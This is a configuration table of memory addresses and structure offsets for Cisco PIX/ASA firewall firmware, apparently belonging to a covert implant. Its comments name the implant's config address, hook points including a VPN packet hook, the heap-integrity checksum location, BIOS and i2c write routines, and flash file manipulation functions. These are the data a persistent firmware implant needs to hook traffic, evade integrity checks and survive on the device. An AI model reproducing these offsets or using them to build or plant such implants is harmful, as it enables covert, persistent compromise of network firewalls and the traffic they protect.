; --- SECTION I ---
;
0x10072300            // pix version
0x7ff000              // address of implant configuration
0x0   0x00addab0      // allocb
0x1   0x00adc460      // freeb
0x2   0x00118390      // open (7.0(+) this is an array for Channel Stuff)
0x3   0x005b6dc0      // ip_put
0x4   0x001184c0      // close
0x5   0x01088808      // atoip
0x6   0x01072a68      // memset
0x7   0x01091828      // memmove
0x8   0x00adc220      // malloc_call_calloc
0x9   0x0107c928      // free
0xa   0x010776e8      // printf
0xb   0x00000014      // interface offset in metaframe
0xc   0x00000010      // offset for vlan number in interface struct
0xd   0x0000005c      // metaframe offset in block structure
0xe   0x00000078      // interface semiphore in metaframe
0xf   0x01080878      // rand
0x15  0x00115d00      // process_create
0x16  0x00116bf0      // process_suspend
0x17  0x00115720      // process_sleep_for
0x18  0x008b8438      // show_process
0x19  0x0000001c      // offset to security level in int_struct
0x1a  0x013e2d60      // cur_t
0x1b  0x04      // channel offset in interface struct
0x1c  0x0c      // PUT offset in channel struct
0x1d  0x24      // offset to dest mac in arp structure
0x1e  0x00      // offset to next hop ip in route structure
0x1f  0x10      // size of route struct
0x20  0x005b86d0      // calc_ip_cksum
0x21  0x005ba7a0      // arp_loopkup
0x22  0x005b8670      // set_block_hdr_mac_and_proto
0x23  0x005cb8b0      // get hardware interface
0x24  0x00ecc8a0      // get next hop
0x25  0x00ed33f0      // get route
0x26  0x005b4150      // send_it
0x27  0x005bc7d0      // arp_create
0x28  0x0090d6c8      // get_hw_iface_2
0x2a  0x3c      // pointer to ethernet frame
0x2b  0x34            // wptr structure offset
0x2c  0x1c            // inIfc (incoming interface) structure offset
0x2d  0x00769cbe      // VPN hook address
0x2e  0x190      // offset from cur_t that contains the current context number
0x2f  0x01362490      // pointer to channnel list
0x30  0x011d0f28      // address of NIC database
0x31  0x00000014      // offset to vlan struct in metaframe (interface offset)
0x32  0x00000020      // offset to IP address in int_struct
0x33  0x00000018      // iface struct adjust from metaframe
0x34  0x01344a70      // max number of interface cards
0x35  0x013e2500      // internal_clock
0x36  0x0090e028      // get_interface_mac
0x37  0x00000127      // offset to hardware interface number in interface struct
0x38  0x4c      // offset to ip in route structure
0x39  0x68      // offset to interface num in route structure
0x3a  0x420      // offset to send channel in channel list
0x3b  0x004ec130      // ifs_read; flash file read routine -- IFS: Read:
0x3c  0x004ec210      // ifs_write; flash file write routine -- IFS: Write:
0x3d  0x004ebad0      // ifs_open; flash file open routine -- IFS: Opened: 
0x3e  0x004ebfe0      // ifs_close; flash file close routine -- IFS: Close: 
0x3f  0x00000080      // offset to next IP fragment pointer in block
0x40  0x013fbd40      // address of context list
0x41  0x005d5070      // address of check for vpn packet function
0x42  0x012ecab4      // checkheaps checksum location
0x43  0x57            // VPN hook block register push opcode
;
; --- END OF SECTION I ---
;
:EOS:
;
; --- SECTION II ---
;
HookLocation        0x007694f7      // address of our hook point
JmpLocation         0x007acce2      // address of our hook point
CheckHeapsLoc       0x012ecab4      // checkheaps checksum location
InterfaceAddr       0x011d0f28      // same as 0x30 above
InterfaceLeng       0x0000019c      // length of interface struct
IntSecurityOffset   0x1c      // security level field offset
IntNameOffset       0x16c      // interface name field offset
IntNumOffset        0x127      // interface number field offset
IntVlanOffset       0x10      // same as 0xc above
IntIPOffset         0x20      // ip address offset in the interface struct
IntNetmaskOffset    0x24      // netmask in the iface struct
FlashClassAddr      0x00000000      // addr of flash structure (not used in 7.*)
CryptoDeviceAddr    0x013e7bd0      // addr of crypto structure
ArpTableAddrPtr     0x011c3210      // addr of first entry in ARP table
NumInterfaces       0x00000000      // addr of pointer to number of interfaces (not used in 7.*)
IfaceStruct2        0x00000000      // addr of pointer to second smaller interface struct (not used in 7.*)
IfaceStruct2Len     0x00      // length of 2nd smaller interface struct used by arp cache (not used in 7.*)
BiosClassAddr       0x013f3370      // addr of the bios class structure
BiosWriteAddr1      0x00435388      // addr of the bios write function for one specific bios
BiosWriteAddr2      0x00438258      // addr of the bios write function for one specific bios
BiosWriteAddr3      0x00437c08      // addr of the bios write function for one specific bios
BiosWriteAddr4      0x00438a58      // addr of the bios write function for one specific bios
BiosWriteOffset     0x00000020      // offset into the bios structure where write addr is located
FlashMkdirAddress   0x004ecbc0      // ifs_mkdir; make flash directory routine -- IFS: Mkdir
ASAFlashRmdirAddress   0x011963be   // ifs_rmdir; remove flash directory routine for the asa
PIXFlashRmdirAddress   0x0042d858      // ifs_rmdir; remove flash directory routine for the pix
ASAFlashRmfileAddress  0x01196031      // ifs_rmfile; remove flash file routine for the asa
PIXFlashRmfileAddress  0x0042d6d8      // ifs_rmfile; remove flash file routine for the pix
FlashDirlistAddress 0x004ec3f0      // ifs_get_dir_entry; get the next file name from a directory listing
FlashGetSizeAddress 0x004eb9b0      // ifs_get_size; get the size of the provided open file
FlashChmodAddress   0x004ec720      // ifs_chmod; change the permissions on a file
FlashMoveFileAddress 0x004ec850     // ifs_rename; move a file
FlashGetFileInfoAddress 0x004ece20  // ifs_get_file_info; returns a structure that contains information about a file, including its size
FlashGetSpaceAddress 0x004ede20     // ifs_get_space_info; returns used and free space in flash
FlashFileInfoSizeOffset 0x00000014  // The offset to the file size in the structure returned by ifs_get_file_info
GetPlatformStringAddr 0x010782c8  // The address of a function that returns the platform string 
ASARestatFlashFlagAddr 0x01416ce0 // The address of the flag that tells the OS on the ASA to re-stat the files in flash (causes used space to be updated)
WatchDogTimeout     0x010fef90      // Address where the thread timeout value is stored 
UpTimeCounter       0x013e2500      // Address of the up time counter
i2cReadByte         0x01089798      // read byte function needed to operate on the bios of the asa 5505
i2cWriteByte        0x010895e8      // write byte function needed to operate on the bios of the asa 5505
;
; --- END OF SECTION II ---
;
:EOS:
;
